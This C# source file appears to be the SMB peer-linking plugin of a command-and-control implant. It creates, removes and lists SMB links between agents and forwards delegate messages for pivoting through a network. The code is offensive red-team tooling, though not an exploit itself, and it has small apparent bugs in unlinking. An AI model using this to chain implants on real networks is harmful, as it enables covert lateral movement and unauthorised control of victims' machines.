using Agent.Interfaces;
using Agent.Models;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin, IForwarderPlugin
    {
        public string Name => "smb";
        private IAgentConfig config { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<string, SmbLink> forwarders = new ConcurrentDictionary<string, SmbLink>();
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
        }

        public async Task Execute(ServerJob job)
        {
            SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(job.task.parameters);
            if (args is null)
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Invalid parameters.",
                    status = "error",
                    completed = true,
                });
                return;
            }
            switch (args.action)
            {
                case "link":
                    await CreateNewLink(args, job.task.id);
                    break;
                case "unlink":
                    if (await UnlinkForwarder(job.task.id))
                    {
                        this.messageManager.AddTaskResponse(new TaskResponse()
                        {
                            task_id = job.task.id,
                            user_output = "Link removed.",
                            status = "error",
                            completed = true,
                        });
                    }
                    else
                    {
                        this.messageManager.AddTaskResponse(new TaskResponse()
                        {
                            task_id = job.task.id,
                            user_output = "Failed to unlink.",
                            status = "error",
                            completed = true,
                        });

                    }
                    break;
                case "list":
                    await ListConnections(job);
                    break;
                default:
                    break;
            }
        }

        public async Task CreateNewLink(SmbLinkArgs args, string task_id)
        {
            //Create a new guid to track our link
            string linkId = Guid.NewGuid().ToString();

            //Create our new SmbLink object
            var link = new SmbLink(messageManager, logger, args, config.uuid, task_id);

            //Add it to the tracker with our randomly generated guid
            if (this.forwarders.TryAdd(linkId, link))
            {
                //Attempt to link it
                EdgeResponse err = await this.forwarders[linkId].Link();
                this.messageManager.AddTaskResponse(err.ToJson());
                return;
            }

            //This gets sent if we already linked to this guid, but should never practically hit.
            this.messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = task_id,
                user_output = "Link already exists.",
                status = "error",
                completed = true
            });

        }

        public async Task<bool> UnlinkForwarder(string linkId)
        {
            return await this.forwarders[linkId].Unlink() && this.forwarders.TryRemove(linkId, out _);
        }

        public async Task ForwardDelegate(DelegateMessage dm)
        {
            if (this.forwarders.Any(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid))
            {
                var fwdr = this.forwarders.Where(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid).First();

                if (!string.IsNullOrEmpty(dm.new_uuid))
                {
                    fwdr.Value.linked_agent_id = dm.new_uuid;
                }
                await fwdr.Value.ForwardDelegateMessage(dm);
            }
        }

        public async Task ListConnections(ServerJob job)
        {
            this.messageManager.AddTaskResponse(new TaskResponse()
            {
                user_output = JsonSerializer.Serialize(this.forwarders),
                task_id = job.task.id,
                completed = true,

            });
        }
    }
}
